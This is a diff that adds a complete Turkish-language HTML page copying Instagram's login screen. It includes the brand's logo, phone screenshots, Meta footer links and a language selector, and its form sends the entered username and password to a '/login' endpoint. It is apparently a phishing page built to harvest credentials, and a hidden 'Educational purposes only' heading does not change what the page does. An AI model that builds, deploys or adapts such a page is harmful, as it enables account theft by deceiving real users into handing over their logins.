@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Instagram">
+    <meta name="author" content="Kemalettin">
+    <link rel="shortcut icon" href="https://i.ibb.co/thyVhTQ/icon.png" alt="icon" type="image/x-icon">
+<!--    <link rel="stylesheet" href="style.css">-->
+<!--    <script src="js/app.js"></script>-->
+<!--    <script src="js/brands.min.js"></script>-->
+<!--    <script src="js/fontawesome.min.js"></script>-->
+    <title>Instagram</title>
+    <script>
+            document.addEventListener('DOMContentLoaded', () => {
+        const screens = document.querySelectorAll('.screen');
+        let currentIndex = 0;
+
+        function showNextScreen() {
+            screens[currentIndex].classList.remove('active');
+            screens[currentIndex].classList.remove('initial'); // Remove the initial class after the first transition
+            currentIndex = (currentIndex + 1) % screens.length;
+            screens[currentIndex].classList.add('active');
+        }
+
+        // Show the first screen initially without transition
+        screens[currentIndex].classList.add('initial');
+
+        // Change screen every 5 seconds (5000 milliseconds)
+        setInterval(showNextScreen, 5000);
+    });
+    </script>
+    <style>
+        * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: Arial, Helvetica, sans-serif;
+        border: none;
+        text-decoration: none;
+        }
+        :root {
+            --cl-white: #fafafa;
+            --cl-gray-dark: #868585;
+            --bg-blue: #63c7e6;
+            --cl-gray-light: #dbdbdb;
+            --bg-white: #ffffff;
+        }
+        body {
+            margin: 80px auto;
+            max-width: 2000px;
+            padding-bottom: 20px;
+            background-color: var(--cl-white);
+            color: var(--cl-gray-dark);
+            zoom: 110%;
+        }
+        .container {
+            display: flex;
+            flex-direction: row;
+            justify-content: center;
+        }
+        /* SMARTPHONE */
+        .smartphone {
+            margin-left: -90px;
+        }
+        .smartphone .screen {
+            position: absolute;
+            margin: 25px 0 0 156px;
+        }
+
+        .image1-class{
+            display: block;
+        }
+        .image2-class{
+            display: block;
+        }
+        .image3-class{
+            display: block;
+        }
+        .fade {
+            opacity: 1;
+            animation: fade 8s linear infinite;
+        }
+        @keyframes fade {
+            0%,100% { opacity: 0 }
+            50% { opacity: 1 }
+            25% { opacity: 1 }
+            75% { opacity: 1 }
+        }
+        /* FORM */
+        .form-area {
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+            padding-top: 15px;
+        }
+        .form-area .logo {
+            width: 355px;
+            padding: 40px 30px 0 90px;
+            margin-bottom: 0;
+            background-color: var(--bg-white);
+            border: 1px solid var(--cl-gray-light);
+            border-bottom: 0;
+        }
+        .form-area .logo img {
+            width: 170px;
+        }
+        .form-area form {
+            display: flex;
+            flex-direction: column;
+            width: 355px;
+            padding: 30px 0 20px 0;
+            align-items: center;
+            background-color: var(--bg-white);
+            border: 1px solid var(--cl-gray-light);
+            border-top: 0;
+        }
+        .form-area form input {
+            border-radius: 4px;
+            width: 280px;
+        }
+        .form-area form input[type=text], form input[type=password] {
+            padding: 13px 0 13px 4px;
+            margin-bottom: 5px;
+            border: 1px solid var(--cl-gray-light);
+            background-color: var(--cl-white);
+            font-size: 13px;
+        }
+        .form-area form button {
+            border-radius: 4px;
+            width: 80%;
+            padding: 5px 10px;
+            margin-top: 10px;
+            color: var(--bg-white);
+            background-color: #8cd6ec;
+            font-weight: 500;
+        }
+        .form-area form button:hover {
+            background-color: var(--bg-blue);
+            cursor: pointer;
+        }
+        form .other-option {
+            display: flex;
+            flex-direction: row;
+            margin: 15px 0;
+            color: var(--cl-gray-dark);
+            font-weight: 700;
+            font-size: 14px;
+        }
+        form .other-option div {
+            width: 110px;
+            height: 1px;
+            background-color: var(--cl-gray-light);
+            margin: 6px 16px;
+        }
+        form .options {
+            margin: 10px 0 0 0;
+            text-align: center;
+        }
+        form .options .social{
+            color: #385185;
+            font-size: 16px;
+            font-weight: 700;
+        }
+        form .options .social:hover {
+            color: #3f37ad;
+        }
+        form .options .forget {
+            margin-top: 22px;
+        }
+        form .options .forget a {
+            color: var(--cl-gray-dark);
+            font-size: 14px;
+        }
+        .form-area .noaccount {
+            width: 355px;
+            margin: 10px 0;
+            padding: 22px;
+            text-align: center;
+            background-color: var(--bg-white);
+            border: 1px solid var(--cl-gray-light);
+            font-size: 14px;
+        }
+        .form-area .noaccount a {
+            color: var(--cl-gray-dark);
+        }
+        .form-area .noaccount a span {
+            color: var(--bg-blue);
+            font-weight: 700;
+        }
+        .form-area .apps {
+            text-align: center;
+            width: 355px;
+            margin-top: 10px;
+            color: var(--cl-gray-dark);
+        }
+        .form-area .apps img {
+            width: 140px;
+            margin-top: 15px;
+        }
+        /* FOOTER */
+        footer {
+            text-align: center;
+            margin: 0 10px;
+            font-size: 14px;
+        }
+        footer a {
+            font-size: 14px;
+            color: var(--cl-gray-dark);
+            margin: 5px 4px;
+        }
+        footer .footer-content { margin-bottom: 5px; }
+        footer .copyright {
+            margin-top: 20px;
+        }
+        footer .copyright select {
+            background: none;
+            color: var(--cl-gray-dark);
+            width: 64px;
+            border: none;
+        }
+        @media screen and (max-width:840px) {
+            body {
+                max-width: 100%;
+            }
+            .smartphone {
+                margin-left: -50px;
+            }
+        }
+        @media screen and (max-width:800px) {
+            .smartphone {
+               display: none;
+            }
+            .form-area {
+                margin-bottom: 50px;
+            }
+        }
+        @media screen and (max-width:435px) {
+            .form-area .logo {
+                width: 100%;
+                margin: auto;
+                padding: 10px auto;
+                background-color: transparent;
+                border: none;
+            }
+            .form-area form {
+                width: 100%;
+                background-color: transparent;
+                border: none;
+                border-top: 0;
+            }
+            .form-area .noaccount {
+                width: 100%;
+                margin: 0;
+                background-color: transparent;
+                border: none;
+            }
+        }
+        .microsoft {
+            zoom: 100%;
+        }
+        .screens {
+            position: relative;
+        }
+        .screen {
+            position: absolute;
+            top: 0;
+            left: 0;
+            opacity: 0;
+            transition: opacity 3s ease-in-out;
+        }
+        .screen.initial {
+            opacity: 1;
+            transition: none; /* No transition for the initial display */
+        }
+        .screen.active {
+            opacity: 1;
+        }
+
+    </style>
+</head>
+<body >
+        <section class="container" style="overflow: hidden;">
+            <!--Telefon başlangıç -->
+            <article class="smartphone">
+                <div class="screens">
+                    <img class="screen image1-class" src="https://i.ibb.co/2yt50JR/screen1.png" alt="screen1">
+                    <img class="screen image2-class" src="https://i.ibb.co/t8xjtsq/screen2.png" alt="screen2">
+                    <img class="screen image3-class" src="https://i.ibb.co/sbxnxL2/screen3.png" alt="screen3">
+                </div>
+                <img src="https://i.ibb.co/YRJRnqN/smartphones.png" alt="smartphones">
+            </article>
+            <!-- Telefon bitiş -->
+            <!-- Form başlangıç -->
+            <article class="form-area">
+                <div class="logo">
+                    <img src="https://i.ibb.co/xDgww2C/logo.png" alt="logo" alt="Instagram Logo">
+                </div>
+                <form action="/login" method="post">
+                    <div>
+                        <input type="text" name="new_username" id="new_username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
+                    </div>
+                    <div>
+                        <input type="password" name="new_password" id="new_password" placeholder="Şifre" required>
+                    </div>
+                    <button type="submit">Giriş Yap</button>
+                    <div class="other-option">
+                        <div></div> <p>YA DA</p> <div></div>
+                    </div>
+                    <div class="options">
+                        <a href="#" class="social"> <span><i class="fab fa-facebook-square"></i></span> Facebook ile Giriş Yap </a>
+                        <div class="forget"> <a href="#">Şifreni mi unuttun?</a> </div>
+                    </div>
+                </form>
+                <div class="noaccount">
+                    <a href="#">Hesabın yok mu? <span>Kaydol</span></a>
+                </div>
+                <div class="apps">
+                    <p>Uygulamayı indir.</p>
+                    <a href="#"> <img src="https://i.ibb.co/fYTYx3f/googleplay.png" alt="Google Play'den alın"> </a>
+                    <a href="#"> <img src="https://static.cdninstagram.com/rsrc.php/v3/yD/r/WFzmKhSYqya.png" class="microsoft" alt="Microsoft'tan edinin"> </a>
+                </div>
+            </article>
+        </section>
+            <!-- Form bitiş-->
+            <!-- footer -->
+        <footer>
+            <div class="footer-content">
+                <a href="#">Meta</a>
+                <a href="#">Hakkında</a>
+                <a href="#">Blog</a>
+                <a href="#">İş Fırsatları</a>
+                <a href="#">API</a>
+                <a href="#">Gizlilik</a>
+                <a href="#">Koşullar</a>
+                <a href="#">Konumlar</a>
+                <a href="#">Instagram Lite</a>
+                <a href="#">Threads</a>
+                <a href="#">Kişi Yükleme ve Hesabı Olmayan Kişiler</a>
+                <a href="#">Meta Verified</a>
+            </div>
+            <div class="copyright">
+                <select aria-label="Dil seçimi">
+                    <option value="tr">Türkçe</option>
+                    <option value="pt">Português (Portugal)</option>
+                    <option value="af">Afrikaans</option>
+                    <option value="cs">Čeština</option>
+                    <option value="da">Dansk</option>
+                    <option value="de">Deutsch</option>
+                    <option value="el">Ελληνικά</option>
+                    <option value="en">English</option>
+                    <option value="en-gb">English (UK)</option>
+                    <option value="es">Español (España)</option>
+                    <option value="es-la">Español</option>
+                    <option value="fi">Suomi</option>
+                    <option value="fr">Français</option>
+                    <option value="id">Bahasa Indonesia</option>
+                    <option value="it">Italiano</option>
+                    <option value="ja">日本語</option>
+                    <option value="ko">한국어</option>
+                    <option value="ms">Bahasa Melayu</option>
+                    <option value="nb">Norsk</option>
+                    <option value="nl">Nederlands</option>
+                    <option value="pl">Polski</option>
+                    <option value="pt-br">Português (Brasil)</option>
+                    <option value="ru">Русский</option>
+                    <option value="sv">Svenska</option>
+                    <option value="th">ภาษาไทย</option>
+                    <option value="tl">Filipino</option>
+                    <option value="zh-cn">中文(简体)</option>
+                    <option value="zh-tw">中文(台灣)</option>
+                    <option value="bn">বাংলা</option>
+                    <option value="gu">ગુજરાતી</option>
+                    <option value="hi">हिन्दी</option>
+                    <option value="hr">Hrvatski</option>
+                    <option value="hu">Magyar</option>
+                    <option value="kn">ಕನ್ನಡ</option>
+                    <option value="sk">Slovenčina</option>
+                    <option value="ta">தமிழ்</option>
+                    <option value="te">తెలుగు</option>
+                    <option value="vi">Tiếng Việt</option>
+                    <option value="zh-hk">中文(香港)</option>
+                    <option value="bg">Български</option>
+                    <option value="ro">Română</option>
+                    <option value="sr">Српски</option>
+                    <option value="uk">Українська</option>
+                </select>
+                <h5 hidden>Educational purposes only</h5>
+            </div>
+        </footer>
+</body>
+</html>
